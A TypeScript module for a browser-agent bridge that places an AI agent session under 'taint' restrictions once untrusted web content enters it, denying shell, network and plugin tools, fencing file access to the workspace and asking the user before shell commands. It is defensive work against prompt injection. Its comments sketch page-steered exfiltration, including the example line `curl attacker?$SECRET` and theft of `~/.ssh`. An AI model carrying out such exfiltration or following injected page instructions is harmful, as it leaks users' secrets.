/** Per-call accounting of the extension results a browser tool call asked for. */
interface Voucher {
  /** Requests sent to an extension. */
  expected: number
  /** Answers the extension vouched exempt (local or trusted pages). */
  exempt: number
  /** Answers the extension marked page-free (approval not granted, cancelled: fixed extension text). */
  pageFree: number
  /** Requests the bridge settled itself after dispatch (timeout, cancel, socket closed): its own fixed text. */
  bridgeSettled: number
  local: boolean
  undelivered: boolean
}

/**
 * Host-side session taint: once untrusted web content entered an agent
 * session through a browser tool (or an injected follow snapshot), that
 * session runs read-only for the harness tools until the user clears it in
 * the extension panel.
 *
 * Mechanism: a monotonic `ctx.tools.guard` (dsh-tools) — evaluated after every
 * `tools/pre-execute` listener and approval, and unable to be turned back into
 * an allow by listener ordering — denies every non-allowlisted tool for a
 * tainted session. This is stricter than `setSandboxMode(session, 'read-only')`
 * and deliberately chosen over it:
 *
 * - a read-only sandbox still runs `bash` (so `curl attacker?$SECRET` works)
 *   and leaves `web_fetch`, subagents, schedules, and plugin tools untouched;
 * - `setSandboxMode` appends a durable `sandbox/mode` event, and the user's
 *   previous override could not be restored exactly on clear.
 *
 * Allowed while tainted: planning/question tools, read-only file tools scoped
 * to the session's own workspace (`read`, `read_image`, `glob`, `grep`), and
 * the `browser_*` tools (the extension gates those itself with its own taint
 * rules; calls of a tainted session carry `tainted: true` on the wire).
 * Everything else — shell, file writes, network fetches (`web_fetch`,
 * `web_search`), delegation, schedules, MCP (`mcp__*`) and other plugin
 * tools — is denied with a message that tells the model how the user can lift
 * the restriction.
 *
 * Lineage: taint follows subagents and forks both ways (see
 * {@link SessionTaintRegistry}). Any browser result taints, failed ones
 * included: error text can quote the page.
 *
 * Exemption: the one browser result that does not taint is one the extension
 * vouched for on its `tool.result` frame (`taintExempt: true`): everything it
 * quotes came from the user's own loopback pages or from sites the user
 * marked trusted, and the extension holds the session untainted. The
 * extension decides because only it knows which frames a result read; the
 * bridge only matches the voucher to the exact tool call
 * ({@link SessionTaintRegistry.takeExempt}) and taints whenever it is missing.
 * The trust direction is the one Clear already uses: the paired extension may
 * lower this bridge's restriction, the agent and pages cannot (the flag is on
 * the authenticated frame, not in the result the model or a page shapes).
 *
 * State is in memory: a Host restart forgets the taint (the extension's own
 * taint, persisted in chrome.storage.session, still applies on the browser
 * side). Fail-closed alternatives would brick every session after a restart.
 *
 * @module @natgurlain/dsh-browser-agent/src/session-taint
 */

import type { Context } from '@deepseek-ai/cordis'
import type {} from '@deepseek-ai/dsh-tools'
import type { BrowserHostApi, HostRpcCall, HostRpcResult } from './host-api.ts'
import { isRecord } from './host-api.ts'
import { lstatSync, realpathSync } from 'node:fs'
import { basename, dirname, isAbsolute, join, relative, resolve } from 'node:path'
import { BRIDGE_TAINT_CLEAR_METHOD, BRIDGE_TAINT_MARK_METHOD } from './protocol.ts'

/**
 * Cross-session and job-output readers a tainted session may not run: a
 * page could steer it into reading another conversation's or a background
 * command's output and smuggling it out through a browser action. Denied
 * explicitly by {@link toolAllowedWhileTainted}, whatever the allowlist says.
 */
export const TAINT_DENIED_READERS: readonly string[] = [
  'session_event_read', 'session_event_search', 'session_event_trace', 'session_search', 'session_trace',
  'job_output', 'job_list', 'team_task_get', 'team_task_list',
]

/** Tools a tainted session may still run (read-only or user-facing). */
export const TAINT_ALLOWED_TOOLS: ReadonlySet<string> = new Set([
  'todo_write',
  'ask_user_question',
  'get_goal',
  'list_agents',
  'list_subagent_models',
  'schedule_list',
  'schedule_view',
  // Never here: TAINT_DENIED_READERS.
  // A structured subagent (a tab-fleet worker) reports its answer through this
  // child-scoped tool; it only hands a value to the parent, which treats it as
  // untrusted page-derived data.
  'structured_output',
])

/**
 * File-reading tools a tainted session may run only on paths inside its own
 * workspace (the session's `cwd`): a page must not steer the model into
 * reading `~/.ssh` or another repository and smuggling it out through a
 * browser action. Maps each tool to the argument naming its path.
 */
export const TAINT_WORKSPACE_READ_TOOLS: ReadonlyMap<string, { arg: string; optional: boolean }> = new Map([
  ['read', { arg: 'file_path', optional: false }],
  ['read_image', { arg: 'file_path', optional: false }],
  ['glob', { arg: 'path', optional: true }],
  ['grep', { arg: 'path', optional: true }],
])

/**
 * Browser tool results that never quote a page. The extension's list has one
 * more entry, `browser_run`: there it is the approval answer (fixed text);
 * here it is the model-facing tool whose result carries the steps' output,
 * so it taints.
 */
const CONTENT_FREE_TOOLS: ReadonlySet<string> = new Set([
  'browser_devtools_network',
  'browser_follow_tab',
  'browser_close_tab',
])

/** Whether a tool may run in a tainted session (path-scoped reads: see {@link workspaceReadDenial}). */
export function toolAllowedWhileTainted(name: string): boolean {
  if (TAINT_DENIED_READERS.includes(name)) return false
  return TAINT_ALLOWED_TOOLS.has(name) || TAINT_WORKSPACE_READ_TOOLS.has(name) || name.startsWith('browser_')
}

/**
 * Whether a tool result can taint its session. Failed browser calls can:
 * their error text may quote the page (an open dialog's message, a field's
 * validation error). Answers that carry only fixed text do not taint
 * ({@link SessionTaintRegistry.takeExempt}): a call refused before it reached
 * a browser, one the bridge timed out or cancelled itself, and one the
 * extension marked page-free (an approval that was not granted).
 * @param name - tool name.
 */
export function resultTaintsSession(name: string): boolean {
  return name.startsWith('browser_') && !CONTENT_FREE_TOOLS.has(name)
}

/**
 * Denial reason when a path-scoped read leaves the session workspace, or
 * undefined when it stays inside. Fails closed: no workspace, a missing or
 * non-string path, `~`, or a glob pattern that climbs out all deny. Symlinks
 * are resolved on the longest existing prefix.
 * @param name - tool name (one of {@link TAINT_WORKSPACE_READ_TOOLS}).
 * @param args - the call arguments.
 * @param workspace - the session's absolute working directory, if known.
 */
export function workspaceReadDenial(name: string, args: unknown, workspace: string | undefined): string | undefined {
  const spec = TAINT_WORKSPACE_READ_TOOLS.get(name)
  if (spec === undefined) return undefined
  const deny = (why: string): string => `Tool "${name}" is limited to this session's workspace while the session holds untrusted web page content (${why}). `
    + 'The user can lift the restriction by typing /browser-clear in this conversation. Do not retry outside the workspace.'
  if (workspace === undefined || !isAbsolute(workspace)) return deny('the session has no workspace directory')
  const record = isRecord(args) ? args : {}
  const pattern = record.pattern
  if (name === 'glob' && typeof pattern === 'string'
    && (isAbsolute(pattern) || pattern.startsWith('~') || /(?:^|[\\/])\.\.(?:[\\/]|$)/u.test(pattern))) {
    return deny('the pattern leaves the workspace')
  }
  const raw = record[spec.arg]
  if (raw === undefined && spec.optional) return undefined
  if (typeof raw !== 'string' || raw.trim() === '') return deny('no path was given')
  if (raw.startsWith('~')) return deny('home-relative paths are not allowed')
  const root = realPathOf(workspace)
  const target = realPathOf(resolve(workspace, raw))
  const rel = relative(root, target)
  return rel === '' || (!rel.startsWith('..') && !isAbsolute(rel)) ? undefined : deny(`${raw} is outside the workspace`)
}

/**
 * File-writing tools a tainted session may run inside its own workspace: an
 * injected page can then at worst change project files, which the user sees
 * in the diff, and never reach `~/.ssh`, another repository, or `.git`
 * (hooks run code). Maps each tool to the argument naming its path.
 */
export const TAINT_WORKSPACE_WRITE_TOOLS: ReadonlyMap<string, string> = new Map([
  ['edit', 'file_path'],
  ['write', 'file_path'],
])

/** Path segments a tainted session may not write under (code that runs on its own, editor and agent config). */
const TAINT_WRITE_DENIED_SEGMENTS: ReadonlySet<string> = new Set(['.git', '.github', '.husky', '.vscode', '.idea', '.claude', '.dsh', '.envrc', 'node_modules'])

/**
 * Denial reason for a file write of a tainted session, or undefined when it
 * stays inside the workspace, outside {@link TAINT_WRITE_DENIED_SEGMENTS},
 * and asks for no wider sandbox. Fails closed like {@link workspaceReadDenial}.
 */
export function workspaceWriteDenial(name: string, args: unknown, workspace: string | undefined): string | undefined {
  const arg = TAINT_WORKSPACE_WRITE_TOOLS.get(name)
  if (arg === undefined) return undefined
  const deny = (why: string): string => `Tool "${name}" may only write inside this session's workspace while the session holds untrusted web page content (${why}). `
    + 'The user can lift the restriction by typing /browser-clear in this conversation.'
  if (workspace === undefined || !isAbsolute(workspace)) return deny('the session has no workspace directory')
  const record = isRecord(args) ? args : {}
  if (record.sandbox_permissions !== undefined) return deny('a wider sandbox is not available')
  const raw = record[arg]
  if (typeof raw !== 'string' || raw.trim() === '') return deny('no path was given')
  // The tools resolve a relative path against the session's current directory, which can differ from the workspace.
  if (!isAbsolute(raw)) return deny(`use an absolute path inside ${workspace}`)
  const root = realPathOf(workspace, true)
  const target = realPathOf(resolve(raw), true)
  const rel = relative(root, target)
  if (rel === '' || rel.startsWith('..') || isAbsolute(rel)) return deny(`${raw} is outside the workspace`)
  // Case-insensitive file systems (macOS, Windows): `.GIT` is `.git`.
  const segment = rel.split(/[\\/]/u).map((part) => part.normalize('NFC').toLowerCase())
    .find((part) => TAINT_WRITE_DENIED_SEGMENTS.has(part) || part.startsWith('.env'))
  if (segment !== undefined) return deny(`${segment} is protected`)
  // A symlink as the target (dangling or not) would write wherever it points.
  try {
    if (lstatSync(resolve(raw)).isSymbolicLink()) return deny(`${raw} is a symbolic link`)
  } catch { /* does not exist yet: a new file */ }
  return undefined
}

/** Tools a tainted session may run once the user approved that exact call. */
export const TAINT_ASK_TOOLS: ReadonlySet<string> = new Set(['bash'])

/** Longest shell command put to the user while tainted: longer ones are refused, never shown cut. */
export const TAINT_ASK_MAX_COMMAND = 4000

/** The question put to the user for a tainted session's shell command. */
export function taintAskReason(name: string, args: unknown, cause: string | undefined): string {
  const record = isRecord(args) ? args : {}
  const command = typeof record.command === 'string' ? record.command : JSON.stringify(args)
  const workdir = typeof record.workdir === 'string' ? ` (in ${record.workdir})` : ''
  return `This conversation read untrusted web content${cause === undefined ? '' : ` (${cause})`}, so a page may be steering it. `
    + `Allow this ${name} command once?${workdir}\n\n${command}`
}

/**
 * Resolve symlinks on the longest existing prefix of a path. `native` uses
 * the OS resolver, which also returns the on-disk case of every component.
 */
function realPathOf(path: string, native = false): string {
  let current = resolve(path)
  const rest: string[] = []
  for (;;) {
    try {
      return join(native ? realpathSync.native(current) : realpathSync(current), ...rest.reverse())
    } catch {
      const parent = dirname(current)
      if (parent === current) return resolve(path)
      rest.push(basename(current))
      current = parent
    }
  }
}

export interface TaintEntry {
  firstTool: string
  since: number
}

/** Longest parent chain followed (cycles, runaway delegation). */
const MAX_LINEAGE_DEPTH = 32

/** In-flight tool calls whose extension results are tracked at once. */
const MAX_VOUCHERS = 2048

function voucherKey(sessionId: string, callId: string): string {
  return `${sessionId}\u0000${callId}`
}

/**
 * In-memory taint per agent session id, plus session lineage (child → parent)
 * so taint cannot be laundered through subagents or forks:
 *
 * - a session that becomes tainted taints every ancestor at once, so a parent
 *   is restricted before the child's (attacker-steered) answer reaches it, and
 *   its other children follow through it;
 * - a session counts as tainted while any ancestor is ({@link isTainted});
 * - a child linked under a tainted parent gets its own copy of the taint, so
 *   clearing the parent alone does not clear the child.
 */
export class SessionTaintRegistry {
  private readonly entries = new Map<string, TaintEntry>()
  private readonly parents = new Map<string, string>()
  /** Extension results per in-flight tool call: how many were requested, how many came back vouched exempt. */
  private readonly vouchers = new Map<string, Voucher>()
  /** Sessions that hold content of vouched-exempt reads (told to their descendants' calls). */
  private readonly exemptReaders = new Set<string>()
  /**
   * Which vouchers this bridge honours: none (`any: false`), or all but the
   * ones resting on a local page (`local: false`, the Host's
   * `devLoop.trustLoopback: false`).
   */
  honour: { any: boolean; local: boolean } = { any: true, local: true }

  constructor(private readonly now: () => number = Date.now) {}

  /** Mark a session and every ancestor tainted. */
  mark(sessionId: string, tool: string): void {
    this.markOne(sessionId, tool)
    for (const ancestor of this.ancestors(sessionId)) this.markOne(ancestor, `${tool} (in subagent ${sessionId})`)
  }

  private markOne(sessionId: string, tool: string): void {
    if (!this.entries.has(sessionId)) this.entries.set(sessionId, { firstTool: tool, since: this.now() })
  }

  /**
   * Record that `child` was created by (or forked from) `parent`. A child of a
   * tainted session starts tainted; a tainted child taints the parent chain.
   * The first link wins; a link that would close a cycle is ignored.
   */
  link(child: string, parent: string): void {
    if (child === parent || this.parents.has(child) || this.ancestors(parent).includes(child)) return
    this.parents.set(child, parent)
    const inherited = this.effective(parent)
    if (inherited !== undefined) this.markOne(child, `${inherited.firstTool} (inherited from ${parent})`)
    const own = this.entries.get(child)
    if (own !== undefined) this.mark(child, own.firstTool)
  }

  /** The recorded parent session, if any. */
  parentOf(sessionId: string): string | undefined {
    return this.parents.get(sessionId)
  }

  /** Ancestors, nearest first. */
  ancestors(sessionId: string): string[] {
    const chain: string[] = []
    let current = this.parents.get(sessionId)
    while (current !== undefined && chain.length < MAX_LINEAGE_DEPTH && current !== sessionId && !chain.includes(current)) {
      chain.push(current)
      current = this.parents.get(current)
    }
    return chain
  }

  /** A tool call is about to ask the extension for one result. */
  expectResult(sessionId: string, callId: string): void {
    const key = voucherKey(sessionId, callId)
    const entry = this.vouchers.get(key)
    if (entry !== undefined) {
      entry.expected += 1
      return
    }
    // Calls whose `tools/result` never fires must not pile up: drop the oldest.
    if (this.vouchers.size >= MAX_VOUCHERS) {
      const oldest = this.vouchers.keys().next()
      if (oldest.done !== true) this.vouchers.delete(oldest.value)
    }
    this.vouchers.set(key, { expected: 1, exempt: 0, pageFree: 0, bridgeSettled: 0, local: false, undelivered: false })
  }

  /**
   * One request of this tool call was refused before it reached any browser:
   * nothing it returns can quote a page. A call that sent nothing at all is
   * content-free; one that also sent requests is judged on those alone.
   */
  noteUndelivered(sessionId: string, callId: string): void {
    const key = voucherKey(sessionId, callId)
    const entry = this.vouchers.get(key)
    if (entry !== undefined) {
      entry.undelivered = true
      return
    }
    if (this.vouchers.size >= MAX_VOUCHERS) {
      const oldest = this.vouchers.keys().next()
      if (oldest.done !== true) this.vouchers.delete(oldest.value)
    }
    this.vouchers.set(key, { expected: 0, exempt: 0, pageFree: 0, bridgeSettled: 0, local: false, undelivered: true })
  }

  /**
   * The extension answered one requested result; `exempt` is its
   * `taintExempt` flag, `local` whether that exemption rests on a local page,
   * `pageFree` its `pageFree` flag (the answer is the extension's own text:
   * an approval that was not granted, a cancel; nothing from a page).
   */
  noteResult(sessionId: string, callId: string, exempt: boolean, local = false, pageFree = false): void {
    const entry = this.vouchers.get(voucherKey(sessionId, callId))
    if (entry === undefined) return
    if (pageFree) {
      entry.pageFree += 1
      return
    }
    if (!exempt) return
    entry.exempt += 1
    if (local) entry.local = true
  }

  /**
   * The bridge settled one dispatched request itself (timeout, cancel, the
   * socket closed): the model sees the bridge's fixed error text, and a late
   * extension answer is dropped, so nothing from a page reaches it.
   */
  noteBridgeSettled(sessionId: string, callId: string): void {
    const entry = this.vouchers.get(voucherKey(sessionId, callId))
    if (entry !== undefined) entry.bridgeSettled += 1
  }

  /** Whether a voucher of this kind is honoured at all. */
  honours(local: boolean): boolean {
    return this.honour.any && (!local || this.honour.local)
  }

  /** The session holds content of an exempt read (a vouched result or injection). */
  noteExemptRead(sessionId: string): void {
    this.exemptReaders.add(sessionId)
  }

  /**
   * Whether a session this one was spawned or forked from read exempt pages.
   * Their content may be in this session's context while the extension has no
   * record of it under this session's id, so the extension is told on every
   * call (`inheritedExemptReads`) and counts an unknown source.
   */
  inheritsExemptReads(sessionId: string): boolean {
    return this.ancestors(sessionId).some((ancestor) => this.exemptReaders.has(ancestor))
  }

  /**
   * Whether this tool call's result is free of unvouched page content: every
   * request it sent came back vouched exempt, page-free, or was settled by
   * the bridge itself. Consumes the record: a voucher covers one tool result,
   * once. No call id, no record, or any request answered with page content
   * the extension did not vouch for all answer false, so the caller taints.
   */
  takeExempt(sessionId: string, callId: string | undefined): boolean {
    if (callId === undefined) return false
    const key = voucherKey(sessionId, callId)
    const entry = this.vouchers.get(key)
    this.vouchers.delete(key)
    // Nothing ever reached a browser: no page content, nothing to vouch for.
    if (entry === undefined) return false
    if (entry.expected === 0) return entry.undelivered
    // Extension flags are vouchers: honoured only while this bridge honours vouchers at all.
    const vouched = this.honour.any ? entry.exempt + entry.pageFree : 0
    if (vouched + entry.bridgeSettled < entry.expected) return false
    if (entry.exempt > 0) {
      if (!this.honours(entry.local)) return false
      this.exemptReaders.add(sessionId)
    }
    return true
  }

  /** Clear only this session's own taint (a tainted ancestor still applies). */
  clear(sessionId: string): boolean {
    return this.entries.delete(sessionId)
  }

  /** This session's own entry. */
  get(sessionId: string): TaintEntry | undefined {
    return this.entries.get(sessionId)
  }

  /** The session's own entry, else the nearest tainted ancestor's. */
  effective(sessionId: string): TaintEntry | undefined {
    const own = this.entries.get(sessionId)
    if (own !== undefined) return own
    for (const ancestor of this.ancestors(sessionId)) {
      const entry = this.entries.get(ancestor)
      if (entry !== undefined) return entry
    }
    return undefined
  }

  /** Whether the session or any ancestor is tainted. */
  isTainted(sessionId: string): boolean {
    return this.effective(sessionId) !== undefined
  }

  /**
   * Drop a purged session's entry and lineage link. Refused (returns false)
   * while another session is linked under it: its children are tainted (and
   * bound to an install) through it, so forgetting it would loosen them.
   */
  forget(sessionId: string): boolean {
    for (const parent of this.parents.values()) if (parent === sessionId) return false
    this.entries.delete(sessionId)
    this.parents.delete(sessionId)
    this.exemptReaders.delete(sessionId)
    return true
  }
}

/** Denied network readers whose job the browser tools can do instead (the denial says how). */
const NETWORK_READ_TOOLS: ReadonlySet<string> = new Set(['web_fetch', 'web_search'])

/** Model-facing reason for a denied tool in a tainted session. */
export function taintDenialReason(name: string, cause?: string): string {
  const disabled = `Tool "${name}" is disabled in this session: it has read untrusted web page content`
    + `${cause === undefined ? '' : ` (first through ${cause})`}, so network, delegation and plugin tools are off `
    + '(shell commands need the user\'s approval; file edits stay inside the workspace) until the user types /browser-clear in this conversation '
    + '(or clicks "Clear" on the banner in the browser panel). '
  // Reading a page is still possible, through the browser: say so instead of sending the model to the user.
  if (NETWORK_READ_TOOLS.has(name)) {
    return `${disabled}Do not retry ${name}. To read a page, open its URL with browser_open_tab or browser_navigate and read it `
      + 'with browser_snapshot; for a search, open a search engine\'s results page the same way.'
  }
  return `${disabled}Do not retry and do not work around it: stop, tell the user what you need and why, and ask them to type /browser-clear if they agree.`
}

/** Options for {@link installSessionTaint}. */
export interface SessionTaintOptions {
  /**
   * Put one call of a tainted session to the user (dsh's approval service:
   * a human in the DSH UI or the panel, never Auto approve; under the
   * `never` policy nobody is asked and the answer is not a grant). Absent:
   * those calls are denied outright, as before.
   */
  askUser?: (request: { sessionId: string; toolName: string; callId: string; reason: string; signal: AbortSignal }) => Promise<string>
}

/** The slice of a dsh Agent the taint guard reads. */
interface AgentLike {
  id: unknown
  session?: { header?: { cwd?: unknown; parentSession?: unknown } }
}

interface GuardExec {
  name: string
  /** The tool call id (`tools/result`), matched to the extension's voucher. */
  callId?: unknown
  arguments?: unknown
  agent?: AgentLike
}

interface AgentsWithInitiator {
  currentInitiator?: () => { id: unknown } | undefined
}

/** Learn a session's parent from its durable header (subagent children). */
function linkFromHeader(registry: SessionTaintRegistry, agent: AgentLike | undefined): void {
  const parent = agent?.session?.header?.parentSession
  if (agent !== undefined && typeof parent === 'string' && parent !== '') registry.link(String(agent.id), parent)
}

/**
 * Observe browser tool results and agent creation, and guard every other tool
 * of a tainted session. Returns the disposer for all of them.
 */
export function installSessionTaint(ctx: Context, registry: SessionTaintRegistry, options: SessionTaintOptions = {}): () => void {
  const disposers: Array<() => void> = []
  // Lineage: a subagent's header names its creator; a fork or child created
  // while another agent drives has that agent as its initiator.
  disposers.push(ctx.on('agent/created', (payload: { agent: AgentLike }) => {
    linkFromHeader(registry, payload.agent)
    try {
      const initiator = (ctx as unknown as { agents?: AgentsWithInitiator }).agents?.currentInitiator?.()
      if (initiator !== undefined && String(initiator.id) !== String(payload.agent.id)) {
        registry.link(String(payload.agent.id), String(initiator.id))
      }
    } catch { /* outside an initiator scope */ }
    return undefined
  }))
  disposers.push(ctx.on('tools/result', (exec: GuardExec) => {
    linkFromHeader(registry, exec.agent)
    const sessionId = exec.agent === undefined ? undefined : String(exec.agent.id)
    if (sessionId === undefined || !exec.name.startsWith('browser_')) return undefined
    // Always consumed, so a voucher can never outlive its own tool call.
    const exempt = registry.takeExempt(sessionId, typeof exec.callId === 'string' ? exec.callId : undefined)
    if (resultTaintsSession(exec.name) && !exempt) registry.mark(sessionId, exec.name)
    return undefined
  }))
  // One-shot grants: the user approved this exact call of a tainted session (bash).
  // Keyed by the execution object itself: pre-execute and the guard receive the same one, so a grant
  // can never outlive its call or match another call that reuses the id.
  const grants = new WeakSet<object>()
  const ask = options.askUser
  if (ask !== undefined) {
    disposers.push(ctx.on('tools/pre-execute', async (rawExec, next) => {
      const exec = rawExec as unknown as GuardExec & { signal?: AbortSignal }
      const decision = await next()
      if (exec.agent === undefined || !TAINT_ASK_TOOLS.has(exec.name)) return decision
      if (decision.kind !== 'allow' && decision.kind !== 'ask') return decision
      const sessionId = String(exec.agent.id)
      linkFromHeader(registry, exec.agent)
      if (!registry.isTainted(sessionId) || typeof exec.callId !== 'string') return decision
      const record = isRecord(exec.arguments) ? exec.arguments : {}
      // A wider sandbox for a page-steered command is never offered, and the user must see all of it.
      if (record.sandbox_permissions !== undefined) return decision
      if (typeof record.command !== 'string' || record.command.length > TAINT_ASK_MAX_COMMAND) return decision
      const outcome = await ask({
        sessionId,
        toolName: exec.name,
        callId: exec.callId as string,
        reason: taintAskReason(exec.name, exec.arguments, registry.effective(sessionId)?.firstTool),
        signal: exec.signal ?? new AbortController().signal,
      }).catch(() => 'unavailable' as const)
      if (outcome === 'allowed-once') grants.add(rawExec as object)
      return decision
    }))
  }
  const denial = (exec: GuardExec): string | undefined => {
    if (exec.agent === undefined) return undefined
    linkFromHeader(registry, exec.agent)
    const sessionId = String(exec.agent.id)
    if (!registry.isTainted(sessionId)) return undefined
    const cause = registry.effective(sessionId)?.firstTool
    const cwd = exec.agent.session?.header?.cwd
    const workspace = typeof cwd === 'string' ? cwd : undefined
    if (TAINT_WORKSPACE_WRITE_TOOLS.has(exec.name)) return workspaceWriteDenial(exec.name, exec.arguments, workspace)
    if (TAINT_ASK_TOOLS.has(exec.name)) {
      // Consumed: a grant covers this one call.
      if (grants.delete(exec as object)) return undefined
      return ask === undefined
        ? taintDenialReason(exec.name, cause)
        : `Tool "${exec.name}" was not run: this session holds untrusted web page content${cause === undefined ? '' : ` (first through ${cause})`}, `
          + 'so every shell command needs the user\'s approval, and it was not given (denied, timed out, nobody could answer, '
          + `longer than ${String(TAINT_ASK_MAX_COMMAND)} characters, or asking for a wider sandbox). `
          + 'Do not retry the same command; tell the user what you need and why. Typing /browser-clear turns shell commands back on without asking.'
    }
    if (!toolAllowedWhileTainted(exec.name)) return taintDenialReason(exec.name, cause)
    return workspaceReadDenial(exec.name, exec.arguments, workspace)
  }
  // dsh-tools in every tested DSH release (src/dsh-support.ts; index.ts refuses older hosts) always has guard().
  disposers.push(ctx.tools.guard((exec) => denial(exec as unknown as GuardExec)))
  return () => { for (const dispose of disposers.reverse()) dispose() }
}

/** Parse the clear payload: `{ sessionId: string | null }`. */
function clearPayload(payload: unknown): { sessionId?: string } | undefined {
  if (!isRecord(payload)) return undefined
  if (payload.sessionId === null || payload.sessionId === undefined) return {}
  return typeof payload.sessionId === 'string' && payload.sessionId !== '' ? { sessionId: payload.sessionId } : undefined
}

/**
 * Serve {@link BRIDGE_TAINT_CLEAR_METHOD} and {@link BRIDGE_TAINT_MARK_METHOD}
 * at the bridge (never forwarded to the Host). Clearing only lowers this bridge's own restriction, and only the
 * extension panel's explicit Clear sends it.
 */
export function withTaintMethods(
  api: BrowserHostApi,
  registry: SessionTaintRegistry,
  allowsSession?: (sessionId: string, signal: AbortSignal) => Promise<boolean>,
): BrowserHostApi {
  return {
    call: async (call: HostRpcCall): Promise<HostRpcResult> => {
      if (call.method === BRIDGE_TAINT_MARK_METHOD) {
        // Marking only raises the restriction, so any session id is accepted
        // without the ownership check (an unknown id taints nothing live).
        const payload = clearPayload(call.payload)
        if (payload?.sessionId === undefined) {
          return { ok: false, error: { code: 'bad-request', message: 'sessionId must be a non-empty string', details: {} } }
        }
        registry.mark(payload.sessionId, 'selection-attachment')
        return { ok: true, value: { marked: true } }
      }
      if (call.method !== BRIDGE_TAINT_CLEAR_METHOD) return api.call(call)
      const payload = clearPayload(call.payload)
      if (payload === undefined) {
        return { ok: false, error: { code: 'bad-request', message: 'sessionId must be a non-empty string or null', details: {} } }
      }
      if (payload.sessionId !== undefined && allowsSession !== undefined
        && !await allowsSession(payload.sessionId, call.signal).catch(() => false)) {
        return { ok: false, error: { code: 'forbidden', message: `session ${JSON.stringify(payload.sessionId)} is not available to the browser bridge`, details: {} } }
      }
      const cleared = payload.sessionId === undefined ? false : registry.clear(payload.sessionId)
      return { ok: true, value: { cleared } }
    },
    events: (signal) => api.events(signal),
    respond: (rpcId, result, signal) => api.respond(rpcId, result, signal),
  }
}
